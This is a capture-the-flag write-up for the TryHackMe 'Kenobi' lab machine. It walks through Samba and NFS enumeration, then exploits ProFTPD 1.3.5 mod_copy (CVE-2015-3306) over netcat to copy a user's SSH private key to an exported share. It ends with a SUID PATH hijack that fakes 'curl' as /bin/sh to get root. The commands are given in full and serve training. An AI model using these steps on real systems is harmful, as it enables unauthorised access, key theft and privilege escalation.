---
title: THM - Kenobi
tags: [thm, smb, ftp, proftpd 1.3.5, CVE-2015-3306, suid]
---

<div style="text-align:center;">
<img src="https://tryhackme-images.s3.amazonaws.com/room-icons/46f437a95b1de43238c290a9c416c8d4.png" alt="Challenge logo" style="height:150px;">
</div>

This room will cover accessing a Samba share, manipulating a vulnerable version of proftpd to gain initial access and escalate your privileges to root via an SUID binary.

## Deploy the vulnerable machine
We have to simply access their VPN and scan the target machine to find how many ports are open.

```
$ nmap -sC -sV -oN nmap/initial 10.10.188.246

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      45558/udp   mountd
|   100005  1,2,3      49389/tcp   mountd
|   100005  1,2,3      59517/udp6  mountd
|   100005  1,2,3      60667/tcp6  mountd
|   100021  1,3,4      36435/tcp   nlockmgr
|   100021  1,3,4      41502/udp   nlockmgr
|   100021  1,3,4      43042/udp6  nlockmgr
|   100021  1,3,4      45249/tcp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2022-09-08T13:04:10
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2022-09-08T08:04:10-05:00
```

We can clearly see that there are 7 open ports. Two services should draw our attention:

- Port 21 is using an outdated version of ProFTPD
- Samba is active on ports 139 and 445 

## Enumerating Samba for shares
Samba is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often referred to as a network file system.

Samba is based on the common client/server protocol of Server Message Block (SMB). SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network.

Using Nmap we can enumerate a machine for SMB shares with a specific script

```
$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.188.246

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.188.246\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 2
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.188.246\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.188.246\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
```

There are 3 shares. Let's inspect `anonymous` with `smbclient`

```
$ smbclient //10.10.188.246/anonymous

Password for [WORKGROUP\zanef]:
Try "help" to get a list of possible commands.
smb: \> l
```

We can see which files are in this shared resource

```
smb: \> l
  .                                   D        0  Wed Sep  4 12:49:09 2019
  ..                                  D        0  Wed Sep  4 12:56:07 2019
  log.txt                             N    12237  Wed Sep  4 12:49:09 2019
```

`logs.txt` looks promising, let's download it

```
$ smbget -R smb://10.10.188.246/anonymous

Password for [zanef] connecting to //10.10.188.246/anonymous: 
Using workgroup WORKGROUP, user zanef
smb://10.10.188.246/anonymous/log.txt                                                                                                                                                           
Downloaded 11,95kB in 2 seconds
```

Within the file we can find very useful information: `kenobi` is a user and inside the `/home/kenobi/.ssh/` directory is his private key

```
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kenobi/.ssh/id_rsa): 
Created directory '/home/kenobi/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
```

If we could find a way to get kenobi's private key we could log into the machine through SSH. Earlier we found that port 111 is running the service `rpcbind`. This is just a server that converts Remote Procedure Call (RPC) program number into universal addresses. In our case, port 111 is access to a network file system (NFS). Lets use nmap to enumerate this

```
$ nmap p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.188.246

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *
```
We can see that `/var` is a mount. This means that we can mount this folder in our machine and access it.

## Gain initial access with ProFtpd

ProFtpd is a free and open-source FTP server, compatible with Unix and Windows systems. Its also been vulnerable in the past software versions.

We can try to use `searchsploit` to find some potential exploits for this particular version

```
$ searchsploit proftpd 1.3.5

-------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                                                                     | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                                                           | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                                                                                                       | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                                                                                                                     | linux/remote/36742.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Nice, four exploits ready to go! We can see that all of them are abusing the `mod_copy` module. This module implements `SITE CPFR` (copy from) and `SITE CPTO` (copy to) commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.

This vulnerability has been identified as `CVE-2015-3306` and its description says: _"The mod_copy module in ProFTPD 1.3.5 allows remote attackers to read and write to arbitrary files via the site cpfr and site cpto commands"_.

Inside `log.txt` we were able to enumerate one user from the machine: `kenobi`. We can try to transfer his SSH private key and log into the machine with it.

```
$ nc 10.10.188.246 21

220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.188.246]

SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

Let's mount the `/var/tmp` directory to our machine

```
$ sudo mkdir /mnt/kenobiTHM
$ mount 10.10.188.246:/var /mnt/kenobiTHM
$ ls -la /mnt/kenobiTHM

totale 48
drwxr-xr-x  2 root root   4096  4 set  2019 backups
drwxr-xr-x  9 root root   4096  4 set  2019 cache
drwxrwxrwt  2 root root   4096  4 set  2019 crash
drwxr-xr-x 40 root root   4096  4 set  2019 lib
drwxrwsr-x  2 root staff  4096 12 apr  2016 local
lrwxrwxrwx  1 root root      9  4 set  2019 lock -> /run/lock
drwxrwxr-x 10 root render 4096  4 set  2019 log
drwxrwsr-x  2 root mail   4096 27 feb  2019 mail
drwxr-xr-x  2 root root   4096 27 feb  2019 opt
lrwxrwxrwx  1 root root      4  4 set  2019 run -> /run
drwxr-xr-x  2 root root   4096 30 gen  2019 snap
drwxr-xr-x  5 root root   4096  4 set  2019 spool
drwxrwxrwt  6 root root   4096  8 set 15.40 tmp
drwxr-xr-x  3 root root   4096  4 set  2019 www
```

Et voilà! Let's copy the private key and access this machine as kenobi

```
$ cp /mnt/kenobiTHM/tmp/id_rsa .
$ sudo chmod 600 id_rsa
$ ssh -i id_rsa kenobi@10.10.188.246

kenobi@kenobi:~$ 
```

We are in :)

Let's get the `user.txt` file and get some points

```
kenobi@kenobi:~$ cat /home/kenobi/user.txt

d0b0f3f53b6caa532a83915e[redacted]
```

## Privilege Escalation with Path Variable Manipulation

What is SUID? A file with SUID always executes as the user who owns the file, regardless of the user passing the command. SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues.

We can find all SUIDs with

```
kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null

/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```

`/usr/bin/menu` looks a little suspicious. Let's see which user is its owner

```
kenobi@kenobi:~$ ls -l /usr/bin/menu

-rwsr-xr-x 1 root root 8880 Sep  4  2019 /usr/bin/menu
```

Root! If we get a shell with this binary we get a root shell!

Let's execute it

```
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
```

This is a simple utility script that prints some information about the machine. We can try to see which strings are written inside the binary

```
kenobi@kenobi:~$ strings /usr/bin/menu

[... snip ...]
curl -I localhost
uname -r
ifconfig
[... snip ...]
```

We can see that the `curl` command is executed without an absolute path (it's not using `/usr/bin/curl`). This means that we could falsify `curl` to be `/bin/sh` and with that we can pop a shell as root (remember that `/usr/bin/menu` is executed as root).

```
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod 777 curl 
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ echo $PATH
/tmp:/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# whoami
root
```

We are root. Let's get the flag

```
# cat /root/root.txt

177b3cd8562289f37382721c[redacted]
```